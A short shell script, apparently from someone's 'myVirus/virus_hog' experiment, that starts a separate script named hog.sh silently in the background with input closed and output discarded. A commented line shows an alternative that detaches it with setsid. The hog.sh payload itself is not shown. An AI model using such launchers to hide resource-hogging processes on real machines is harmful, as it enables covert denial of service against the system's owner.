#!/bin/sh
umask 0; sh hog.sh 0<&- &>/dev/null & # $( cd /; umask 0; setsid  ~/workspace/myVirus/virus_hog/hog.sh </dev/null &>/dev/null & )
